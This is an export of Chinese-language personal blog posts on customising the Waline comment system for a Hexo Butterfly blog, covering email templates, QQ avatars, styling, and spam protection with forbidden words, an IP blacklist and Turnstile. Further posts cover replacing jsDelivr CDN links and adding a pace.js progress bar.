<li>把洪涝示例中变量的形式改成 Waline 中变量的形式，比如 <code>${NICK}</code> 改为 <code>{{self.nick}}</code></li>
<li>评论内容记得加上 <code>safe</code>，否则信件中显示的是 raw html 字符 [^字符显示]。如：<code>{{self.comment|safe}}</code>。</li>
<li>链接地址加上 <code>https://</code>，否则点不了。如 <code>href=&quot;https://{{site.url}}&quot;</code></li>
<li>Bug 修复：主框宽度调整。手机端、电脑端邮件显示正常。暗黑模式显示正常。</li>
</ul>
<p>[^字符显示]: <a href="https://github.com/walinejs/waline/issues/1034">[Bug]: 自定义邮件通知模板后评论内容显示问题 · Issue #1034 · walinejs/waline (github.com)</a></p>
<h3>模板</h3>
<p>以下代码可直接写入 Waline 项目里 Vercel 环境变量：</p>
<pre><code class="language-html">&lt;div class=&quot;page flex-col&quot;&gt;
    &lt;div class=&quot;box_3 flex-col&quot; style=&quot;
    display: flex;
    position: relative;
    width: 100%;
    height: 206px;
    background: #859cef2e;
    top: 0;
    left: 0;
    justify-content: center;
  &quot;&gt;&lt;div class=&quot;section_1 flex-col&quot; style=&quot;
    background-image: url(https://cdn.gallery.uuanqin.top/img/qlogo.png);
    position: absolute;
    width: 152px;
    height: 152px;
    display: flex;
    top: 130px;
    background-size: cover;
  &quot;&gt;&lt;/div&gt;&lt;/div&gt;
    &lt;div class=&quot;box_4 flex-col&quot; style=&quot;
    margin-top: 92px;
    display: flex;
    flex-direction: column;
    align-items: center;
  &quot;&gt;
      &lt;div class=&quot;text-group_5 flex-col justify-between&quot; style=&quot;
    display: flex;
    flex-direction: column;
    align-items: center;
    margin: 0 20px;
  &quot;&gt;
        &lt;span class=&quot;text_1&quot; style=&quot;
    font-size: 26px;
    font-family: PingFang-SC-Bold, PingFang-SC;
    font-weight: bold;
    color: #000000;
    line-height: 37px;
    text-align: center;
  &quot;&gt;嘿！你有一条新的回复&lt;/span&gt;
        &lt;span class=&quot;text_2&quot; style=&quot;
    font-size: 16px;
    font-family: PingFang-SC-Bold, PingFang-SC;
    font-weight: bold;
    color: #00000050;
    line-height: 22px;
    margin-top: 21px;
    text-align: center;
  &quot;&gt;你在&amp;nbsp;{{site.name|safe}} 博客中留下的评论收到来自&amp;nbsp;{{self.nick}}&amp;nbsp;的回复&lt;/span&gt;
      &lt;/div&gt;
      &lt;div class=&quot;box_2 flex-row&quot; style=&quot;
    margin: 0 20px;
    min-height: 128px;
    background: #F7F7F7;
    border-radius: 12px;
    margin-top: 34px;
    display: flex;
    flex-direction: column;
    align-items: flex-start;
    padding: 32px 16px;
    width: 95%;
  &quot;&gt;

        &lt;div class=&quot;text-wrapper_4 flex-col justify-between&quot; style=&quot;
    display: flex;
    flex-direction: column;
    margin-left: 30px;
    margin-bottom: 16px;
  &quot;&gt;
          &lt;span class=&quot;text_3&quot; style=&quot;
    height: 22px;
    font-size: 13px;
    font-family: PingFang-SC-Bold, PingFang-SC;
    font-weight: bold;
    color: #2a67ce;
    line-height: 22px;
  &quot;&gt;{{parent.nick|safe}}&lt;/span&gt;
          &lt;span class=&quot;text_4&quot; style=&quot;
    margin-top: 6px;
    margin-right: 22px;
    font-size: 13px;
    font-family: PingFangSC-Regular, PingFang SC;
    font-weight: 400;
    color: #000000;
    line-height: 22px;
  &quot;&gt;{{parent.comment|safe}}&lt;/span&gt;
        &lt;/div&gt;&lt;hr style=&quot;
      display: flex;
      position: relative;
      border: 1px dashed #859cef2e;
      box-sizing: content-box;
      height: 0px;
      overflow: visible;
      width: 100%;
  &quot;&gt;&lt;div class=&quot;text-wrapper_4 flex-col justify-between&quot; style=&quot;
    display: flex;
    flex-direction: column;
    margin-left: 30px;
  &quot;&gt;
  &lt;hr&gt;
          &lt;span class=&quot;text_3&quot; style=&quot;
    height: 22px;
    font-size: 16px;
    font-family: PingFang-SC-Bold, PingFang-SC;
    font-weight: bold;
    color: #2a67ce;
    line-height: 22px;
  &quot;&gt;{{self.nick|safe}}&lt;/span&gt;
          &lt;span class=&quot;text_4&quot; style=&quot;
    margin-top: 6px;
    margin-right: 22px;
    font-size: 16px;
    font-family: PingFangSC-Regular, PingFang SC;
    font-weight: 400;
    color: #000000;
    line-height: 22px;
  &quot;&gt;{{self.comment|safe}}&lt;/span&gt;
        &lt;/div&gt;

        &lt;a class=&quot;text-wrapper_2 flex-col&quot; style=&quot;
    min-width: 106px;
    height: 38px;
    background: #859cef2e;
    border-radius: 32px;
    display: flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    margin: auto;
    margin-top: 32px;
  &quot; href=&quot;https://{{site.postUrl}}&quot;&gt;
          &lt;span class=&quot;text_5&quot; style=&quot;
    color: #218adb;
  &quot;&gt;查看详情&lt;/span&gt;
        &lt;/a&gt;
      &lt;/div&gt;
      &lt;div class=&quot;text-group_6 flex-col justify-between&quot; style=&quot;
    display: flex;
    flex-direction: column;
    align-items: center;
    margin-top: 34px;
  &quot;&gt;
        &lt;span class=&quot;text_6&quot; style=&quot;
    height: 17px;
    font-size: 12px;
    font-family: PingFangSC-Regular, PingFang SC;
    font-weight: 400;
    color: #00000045;
    line-height: 17px;
  &quot;&gt;此邮件由评论服务自动发出，直接回复无效。&lt;/span&gt;
        &lt;a class=&quot;text_7&quot; style=&quot;
    height: 17px;
    font-size: 12px;
    font-family: PingFangSC-Regular, PingFang SC;
    font-weight: 400;
    color: #218adb;
    line-height: 17px;
    margin-top: 6px;
    text-decoration: none;
  &quot; href=&quot;https://{{site.url}}&quot;&gt;前往博客&lt;/a&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/div&gt;
</code></pre>
<h3>其他模板参考链接</h3>
<p>其他样例参考：</p>
<ul>
<li><a href="https://www.sarakale.top/blog/posts/537344b2.html">waline 邮件通知模板样式一览 | SaraKale's blog</a></li>
<li><a href="https://blog.jyhao.cn/posts/17978.html">自定义 Waline/Twikoo 邮件通知样式 | Night1918 Blog (jyhao.cn)</a></li>
<li><a href="https://cloud.tencent.com/developer/article/2211729">Fluid -29- 修改 waline 邮箱通知模板 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></li>
</ul>
<h1>输入 QQ 邮箱自动获取 QQ 头像（服务端配置）</h1>
<p>如果你的 Waline 服务端是按照官方推荐的 Vercel 部署方式，那么你可以打开 Vercel 对应的 Github 仓库，修改 index.js 文件，将以下内容添加至方框位置：</p>
<pre><code class="language-js">/*
此方法或传入一个 comment 对象，你可以通过 comment.mail 获取邮箱。若返回值为 string 类型，则会直接调用返回值作为头像地址，否则正常生成 MD5。
*/
async avatarUrl(comment) {
    const reg = new RegExp('(\\d+)@qq\\.com$', 'i');
    const mail = comment.mail;
    if (reg.test(mail)) {
      const q = mail.replace(/@qq\.com/i, '').toLowerCase();
      return 'https://q1.qlogo.cn/headimg_dl?dst_uin=' + q + '&amp;spec=4';
    }
  },
</code></pre>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230428162327261.png" alt="image-20230428162327261|500"></p>
<blockquote>
<p>你也可以试着写一个根据 QQ 号自动获取头像和邮箱的函数</p>
</blockquote>
<p>参考：<a href="https://waline.js.org/reference/server/config.html#afterdelete-commentid">服务端配置 | Waline</a></p>
<h1>评论区美化（客户端配置）</h1>
<blockquote>
<p>本小节以 Hexo 的 Butterfly 主题为例。</p>
</blockquote>
<p>Butterfly 的主题配置文件中 Waline 有一个 option 字段，里面可以定制自己想要的客户端。在 Waline 官方文档中有很多定制选项。</p>
<p>如何将 Waline 官方文档中的内容与 option 字段结合起来？我的理解是，关注官网 js 示例中的 init 字段，把自定义的地方放到 option 中。那怎么放，放什么，格式是什么，接下来跟着我的示例进行即可。</p>
<h2>自定义显示文字</h2>
<p>打开主题配置文件，在 option 中进行配置，配置方法：</p>
<pre><code class="language-yaml">waline:
  option:
    locale: {
      nick: '昵称',
      mail: '邮箱',
      link: '你的网站',
      placeholder: '填写数字QQ邮箱可以自动获取QQ头像',
      requiredMeta: [],
      sofa: '评论区空空如也~呜呜呜',
      anonymous: '匿名的野猫',
      login: '登录(可选)'
      }
</code></pre>
<p><code>locale</code> 写法参照 <a href="https://waline.js.org/cookbook/customize/locale.html#locale-%E9%80%89%E9%A1%B9">自定义语言 | Waline</a></p>
<p>参考：<a href="https://afish.org/2022/11/01/waline_comment/">Hexo|Butterfly 添加 Waline 评论系统 | 小鱼の blog (afish.org)</a></p>
<h2>表情选项卡配置</h2>
<pre><code class="language-yaml">waline:
  option:
    emoji:
    - '//unpkg.com/@waline/emojis@1.1.0/bilibili'
    - '//unpkg.com/@waline/emojis@1.1.0/qq'
    - '//unpkg.com/@waline/emojis@1.1.0/tieba'
    - '//unpkg.com/@waline/emojis@1.1.0/weibo'
</code></pre>
<p>注意到官网配置中 emoji 是一个列表的写法，那转写到 Butterfly 主题配置文件中就以 yaml 的列表写法。</p>
<p><code>emoji</code> 写法参照：<a href="https://waline.js.org/guide/features/emoji.html">表情选项卡 | Waline</a></p>
<h2>反应配置</h2>
<p>Waline 中反应指的是文章下方的表态：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230429172431151.png" alt="image-20230429172431151|375"></p>
<p>写法：</p>
<pre><code class="language-yaml">waline:
  option:
    reaction: true # 开启快速反应
</code></pre>
<p>或自己自定义反应：</p>
<pre><code class="language-yaml">waline:
  option:
    reaction:
    - 表情地址1
    - 表情地址2
    # 最多支持9个
</code></pre>
<p><code>reaction</code> 写法参照：<a href="https://waline.js.org/guide/features/reaction.html">文章反应 | Waline</a></p>
<h2>魔改 CSS</h2>
<p>本来涉及 CSS 的修改，应该另写 css 文件再通过 inject 引入的（这也是 Waline 官方推荐的做法）。但是试了不太成功，所以打算把 waline.css 下载到本地，再将 CDN 指向本地位置。不优雅，但能凑合用。</p>
<h3>主题颜色修改</h3>
<p>CSS 下载到了本地就好办了。根据官方给的 <a href="https://waline.js.org/reference/client/style.html">CSS 变量</a> 说明，我们可以自己更改 css 文件。</p>
<h3>评论区背景图</h3>
<p>我的做法是在 css 中加上：</p>
<pre><code class="language-css">.wl-editor {
    background-image: url(图片地址);
    background-size: 10%;
    background-repeat: no-repeat;
    background-position: right bottom;
    background-color: rgba(255, 255, 255, 0);
    resize: vertical
}
.wl-editor:focus{
    background-position-x: 800px;
    background-position-y: 1000px;
    transition: all 0.2s ease-in-out 0s;
}
</code></pre>
<p>记得隔一段时间就和官网 CSS 同步一下。</p>
<p>参考文章：<a href="https://zhuanlan.zhihu.com/p/581640626">Hexo 中 Buttefly 主题 Valine 评论系统配置以及美化（七） - 知乎 (zhihu.com)</a></p>
<h3>为评论区增加输入提醒</h3>
<p>详看这篇文章：<a href="#3015602463" title="为评论系统增加输入提醒【Waline】" class="record-link ">为评论系统增加输入提醒【Waline】</a></p>
<h1>评论安全</h1>
<blockquote>
<p>[!hint] 来自博主提醒<br>
关于评论安全我也哆嗦几句，所有站长均需留意：</p>
<ol>
<li>不法分子会利用特殊方法将违规内容评论在站点不存在的链接上。站长需及时接收评论通知并检查 waline 后端及时处理。</li>
<li>不法分子的评论文本也许会很正常，但携带只有在外网才能查看的违规图片，导致一些站长在平时日常检视、邮件通知中没有留意。这种情况需要多加留心，我们可以在 Waline 后台点击评论的编辑按钮查看是否携带了不明链接。</li>
<li>参看官方文档完善更多的安全措施：<a href="https://waline.js.org/reference/server/env.html#%E5%AE%89%E5%85%A8">服务端环境变量 | Waline</a></li>
</ol>
</blockquote>
<h2>设置违禁词（服务端配置）</h2>
<blockquote>
<p>最近苦于梯子广告入侵，设置违禁词可以解决这个问题。</p>
</blockquote>
<p>修改在 Github 上 Waline 文件 index.js：</p>
<pre><code class="language-js">module.exports = Application({
  // 违禁词
  forbiddenWords: ['免费节点'],
});
</code></pre>
<p>评论带有违禁词的统一当做垃圾评论处理，存在误判的话可以从垃圾箱中恢复。</p>
<p>参考：<a href="https://waline.js.org/reference/server/config.html#forbiddenwords">服务端配置 | Waline</a></p>
<h2>设置 IP 黑名单</h2>
<blockquote>
<p>最近存在沙币乱评论，得试试黑名单功能了</p>
</blockquote>
<p>配置方法和设置违禁词一样：</p>
<pre><code class="language-js">module.exports = Application({
  // 黑名单
  disallowIPList: ['4.4.4.4'],
});
</code></pre>
<p>参考：<a href="https://waline.js.org/reference/server/config.html#disallowiplist">服务端配置 | Waline</a></p>
<h2>使用 Turnstile 验证码服务</h2>
<h3>Turnstile 服务注册</h3>
<p><a href="https://www.cloudflare-cn.com/products/turnstile/">Cloudflare Turnstile</a> 是一款替代 CAPTCHA 的免费工具，相比于谷歌 reCAPTCHA，它不需要繁琐的选择红绿灯消防栓之类的交互。</p>
<p>根据网站提示自己注册一个。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240217184356.webp" alt="image.png|500"></p>
<p>配置时安全域名需要同时添加网站地址和 Waline 服务端地址（不包含传输协议，即 <code>http://</code> 或 <code>https://</code>）。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240217184318.webp" alt="image.png|475"></p>
<p>记住这两串 KEY，待会配置需要用到：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240217184616.webp" alt="image.png|500"></p>
<blockquote>
<p>注意，打算关闭 Turnstile 时服务端环境变量和客户端配置要同时删去。免去不必要的错误 [^turn]。</p>
</blockquote>
<p>[^turn]: <a href="https://github.com/walinejs/waline/issues/2427">[Bug]: 未登录用户评论时报Forbidden提示 Issue #2427 · walinejs/waline (github.com)</a></p>
<h3>服务端配置（以 Vercel 部署方案为例）</h3>
<p>打开 Vercel 中 waline 服务端项目的环境变量设置，新建这两个环境变量并输入对应的值。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240217185017.webp" alt="image.png"></p>
<table>
<thead>
<tr>
<th>环境变量名</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>TURNSTILE_KEY</code></td>
<td>Turnstile key，须与客户端同时配置</td>
</tr>
<tr>
<td><code>TURNSTILE_SECRET</code></td>
<td>Turnstile secret，服务端使用，不可泄漏</td>
</tr>
</tbody>
</table>
<p>环境变量配置好后建议执行 Redeploy。</p>
<h3>客户端配置（以 Hexo-Butterfly 主题为例）</h3>
<p>Butterfly 主题配置文件 waline 部分为：</p>
<pre><code class="language-yaml">waline:
  serverURL: https://pl.uuanqin.top # Waline server address url
  bg: # waline background
  pageview: false
  option:
    turnstileKey: '0x4AAAAAAAXXXXXXXXXXX' # 这里填写你的 turnstile site key
</code></pre>
<blockquote>
<p>[!Notice] 请注意保持 waline.js 为较新版本，否则会出现未知错误<br>
比如，在 Butterfly 主题配置文件使用 waline_js 的 cdn 链接版本至少为 <a href="https://cdn.bootcdn.net/ajax/libs/waline/2.15.7/waline.min.js">https://cdn.bootcdn.net/ajax/libs/waline/2.15.7/waline.min.js</a> 。之前使用 2.15.1 版本会出现报错。</p>
</blockquote>
<p>部署好后尝试评论，可以在 cloudflare 查看监控数据。</p>
<p>参考：</p>
<ul>
<li><a href="https://waline.js.org/reference/client/props.html#turnstilekey">组件属性 | Waline</a></li>
<li><a href="https://waline.js.org/reference/server/env.html#%E5%AE%89%E5%85%A8">服务端环境变量 | Waline</a></li>
</ul>
<h2>使用自己的 Askimet 反垃圾评论服务</h2>
<p>Waline 默认开启了 Askimet 反垃圾评论服务，调用了 Waline 提供的 Akismet API Key。</p>
<p>如果需要的话，我们也可以注册一个自己的：</p>
<ul>
<li>官网 <a href="https://akismet.com/">Akismet – Spam Protection for Websites</a>。网站使用的是 <a href="http://Wordpress.com">Wordpress.com</a> 账号。</li>
<li>API Key 管理面板：<a href="https://akismet.com/account/">Account Management – Akismet</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="3015602463">
                            <a href="#3015602463">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>为评论系统增加输入提醒【Waline】</span>
                                
                                <div class="record-links-context hover">
                                    <p>如果想为评论区增加悬浮小气泡输入提醒，详见这篇文章：<a href="#3015602463" title="为评论系统增加输入提醒【Waline】" class="record-link highlight">为评论系统增加输入提醒【Waline】</a></p>
<p>详看这篇文章：<a href="#3015602463" title="为评论系统增加输入提醒【Waline】" class="record-link highlight">为评论系统增加输入提醒【Waline】</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3790495434">
                            <a href="#3790495434">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客与 Waline 评论区实现外链跳转中间页</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>Waline 邮件通知的设置</li>
<li>输入 QQ 邮箱自动获取 QQ 头像的配置</li>
<li>评论区美化要点</li>
<li>评论安全
<ol>
<li>设置违禁词的方法</li>
<li>设置 IP 黑名单</li>
<li>使用 Turnstile 验证码服务</li>
</ol>
</li>
<li>评论外链中间页详见：<a href="#3790495434" title="Hexo 博客与 Waline 评论区实现外链跳转中间页" class="record-link highlight">Hexo 博客与 Waline 评论区实现外链跳转中间页</a></li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="1495212389">
                            <a href="#1495212389">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li><a href="#3709373237" title="定制自己的 Waline 评论系统" class="record-link highlight">定制自己的 Waline 评论系统</a></li>
<li><a href="#3015602463" title="为评论系统增加输入提醒【Waline】" class="record-link ">为评论系统增加输入提醒【Waline】</a></li>
<li><a href="#3790495434" title="Hexo 博客与 Waline 评论区实现外链跳转中间页" class="record-link ">Hexo 博客与 Waline 评论区实现外链跳转中间页</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3015602463">
                            <a href="#3015602463">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>为评论系统增加输入提醒【Waline】</span>
                                
                                <div class="record-links-context hover">
                                    <p>其他 Waline 评论区美化教程：<a href="#3709373237" title="定制自己的 Waline 评论系统" class="record-link highlight">定制自己的 Waline 评论系统</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="2065118013" class="record">
            <header>
                <h1 class="record-title">国内访问 Hexo 优化加速（CDN链接替换）</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, Hexo</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('jsdelivr');">jsdelivr</button>
                    
                    <button class="btn" onclick="activeTag('CDN');">CDN</button>
                    
                    <button class="btn" onclick="activeTag('Butterfly');">Butterfly</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/28/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/jsdeliver-banned.png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>由于某种原因，jsdelivr的状况时好时坏，本文介绍Butterfly下替换CDN链接的解决方案</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>7b17333d</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>假设你刚搭建了个人博客，发现网站的访问速度实在堪忧，怎么办？解决方法无非以下几种方法：</p>
<ul>
<li>有经济实力的，考虑提升硬件性能和带宽（购买高级服务器、增大带宽）</li>
<li>正确使用 CDN 加速源站和图片</li>
<li>如果你的个人博客网站是动态网站（如 Wordpress），但实在没有必要必须是动态网站时，可尝试改成静态框架 [^hexo]</li>
</ul>
<p>[^hexo]: 详看我的这篇文章：<a href="#181570378" title="部署 Hexo 个人博客框架到服务器" class="record-link ">部署 Hexo 个人博客框架到服务器</a></p>
<p>如果以上的方法你都尝试过，但博客网站可能遇到页面卡顿、显示不全、功能异常（图标、评论、搜索等各种异常）等情况，比如：</p>
<ul>
<li>fontawesome 加载迟、卡，拖慢网页加载 [^hb]。</li>
<li>algolia 搜索按钮按不出来</li>
<li>Waline 评论系统不显示或评论数据无法获取 [^bw]</li>
</ul>
<p>[^hb]: fontawesome 可以考虑更换图标库，请看我之前的文章 <a href="#1215492985" title="装点你的 Butterfly 博客" class="record-link ">装点你的 Butterfly 博客</a><br>
[^bw]: 处理这个问题前请看我之前的文章：<a href="#1495212389" title="Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问" class="record-link ">Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问</a></p>
<p>而使用魔法访问时却一切正常。这时候我们该考虑是不是 CDN 出现问题了。</p>
<p>本地调试自己的博客网站后，打开浏览器的开发者面板（F12）-&gt;禁用缓存 -&gt;点击网络选项卡 -&gt;刷新页面：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/jsdeliver%E6%83%B9%E7%9A%84%E7%A5%B81.png" alt="jsdeliver惹的祸1"></p>
<p>你会发现一些 js 文件或 css 文件无法被加载，这些文件大多来源于 jsdelivr 的 CDN 连接。</p>
<blockquote>
<p>不熟悉 CDN 的小伙伴可以理解为，jsdelivr 里存放了大量的 js 文件或 css 文件，你的博客网站需要引入这些文件，但是由于某种原因，jsdelivr 结点的链接状况在国内时好时坏（使用魔法就好）。</p>
</blockquote>
<p>这时我们可以考虑把获取这些 js 或 css 文件的链接替换掉。在你的主题配置上进行替换，这里以 Butterfly 主题为例，在主题配置文件下找到：</p>
<pre><code class="language-yaml">CDN:
    option:
        fontawesome: &lt;替换的cdn&gt;
</code></pre>
<p>建议你把涉及 jsdelivr 都替换掉吧，让中国宝宝访问你的博客网站更快更方便。</p>
<p>各种资源 CDN 链接参考：<a href="https://blog.zhheo.com/p/790087d9.html">Butterfly CDN 链接更改指南，替换 jsdelivr 提升访问速度 | 张洪 Heo (zhheo.com)</a></p>
<p>也可以在下面的两个网站找：</p>
<ul>
<li><a href="https://cdnjs.com/">https://cdnjs.com/</a></li>
<li><a href="https://www.bootcdn.cn/">https://www.bootcdn.cn/</a></li>
</ul>
<p>也可以把文件放在自己的存储桶中（注意看好你的钱包）。</p>
<p>参考：</p>
<ul>
<li><a href="https://blog.zhheo.com/p/790087d9.html">Butterfly CDN 链接更改指南，替换 jsdelivr 提升访问速度 | 张洪 Heo (zhheo.com)</a></li>
<li><a href="https://blog.csdn.net/u013014254/article/details/122045331">jsdelivr 炸了如何解决|用这些免费 cdn_地域男孩的博客-CSDN 博客</a></li>
<li><a href="https://butterfly.js.org/posts/ceeb73f/#custom-format">Butterfly 安裝文檔(四) 主題配置-2 | Butterfly</a></li>
<li><a href="https://github.com/jerryc127/hexo-theme-butterfly/issues/1243">fontawesome 图标问题 · Issue #1243 · jerryc127/hexo-theme-butterfly (github.com)</a></li>
</ul>
<blockquote>
<p>其他优化博客网站的好文（我没仔细看，但是他讲的好有道理）：</p>
<ul>
<li><a href="https://akilar.top/posts/7c16c4bb/">Hexo 博客优化蓝图 | Akilar の糖果屋</a></li>
<li><a href="https://blog.mrzefr.cn/posts/hexo-speed/">MrZeFr 的小窝 - Hello World</a></li>
</ul>
</blockquote>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">3</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="181570378">
                            <a href="#181570378">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>部署 Hexo 个人博客框架到服务器</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^hexo]: 详看我的这篇文章：<a href="#181570378" title="部署 Hexo 个人博客框架到服务器" class="record-link highlight">部署 Hexo 个人博客框架到服务器</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1215492985">
                            <a href="#1215492985">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>装点你的 Butterfly 博客</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^hb]: fontawesome 可以考虑更换图标库，请看我之前的文章 <a href="#1215492985" title="装点你的 Butterfly 博客" class="record-link highlight">装点你的 Butterfly 博客</a><br>
[^bw]: 处理这个问题前请看我之前的文章：<a href="#1495212389" title="Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问" class="record-link ">Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1495212389">
                            <a href="#1495212389">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^hb]: fontawesome 可以考虑更换图标库，请看我之前的文章 <a href="#1215492985" title="装点你的 Butterfly 博客" class="record-link ">装点你的 Butterfly 博客</a><br>
[^bw]: 处理这个问题前请看我之前的文章：<a href="#1495212389" title="Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问" class="record-link highlight">Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="2966071784">
                            <a href="#2966071784">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>server、sqlite 朋友圈部署方案</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^jsd]: 参考 <a href="#2065118013" title="国内访问 Hexo 优化加速（CDN链接替换）" class="record-link highlight">国内访问 Hexo 优化加速（CDN链接替换）</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2346883624">
                            <a href="#2346883624">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_百味人生);">⬤</span>
                                    
                                    <span style="color: var(--n_社会生活);">⬤</span>
                                    
                                </span>
                                
                                <span>成为一名个人博客网站站长</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li>Wordpress： <a href="https://blog.csdn.net/lieweihan0913/article/details/95631632">【WordPress】 网站打开速度太慢了，两招解决_wordpress 太慢_辉哥笔记的博客-CSDN 博客</a></li>
<li>Hexo：<a href="#2065118013" title="国内访问 Hexo 优化加速（CDN链接替换）" class="record-link highlight">国内访问 Hexo 优化加速（CDN链接替换）</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="1308325830" class="record">
            <header>
                <h1 class="record-title">在你的 Hexo 博客上加入进度条</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, Hexo</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('pace');">pace</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/28/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20230428200419(1).jpg</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>通过进入pace.js以及本地css实现网站顶部进度条</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>4dfb77c6</span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>引入方法</h1>
<p>如果你使用的是 Butterfly 主题，可以在主题配置文件中加入：</p>
<pre><code class="language-yaml">inject:
  head:
      - &lt;script src=&quot;https://npm.elemecdn.com/pace-js@latest/pace.min.js&quot;&gt;&lt;/script&gt; # pace.js文件
      - &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/&lt;your_pace.css&gt;&quot;&gt;
</code></pre>
<blockquote>
<p>新版本 Butterfly 配置文件中有内置的 pace 选项，但是它的 pace.js 使用的 jsdelivr 提供的 CDN，国内访问困难，CDN 项也没有相应更改的地方，建议按照这篇文章的说明使用老方法进行进度条的引入。</p>
</blockquote>
<h1>基本样式</h1>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230428202826301.png" alt="image-20230428202826301"></p>
<p>PACE 官网给出的示例，这里已把官网的 jsdelivr 连接替换掉了：</p>
<pre><code>https://cdn.bootcdn.net/ajax/libs/pace/1.2.4/pace-theme-default.min.css
</code></pre>
<h1>官网样式</h1>
<p>可以在这里挑选你喜欢的样式并下载对应的 CSS 文件：<a href="https://codebyzach.github.io/pace/">PACE — Automatic page load progress bars (codebyzach.github.io)</a></p>
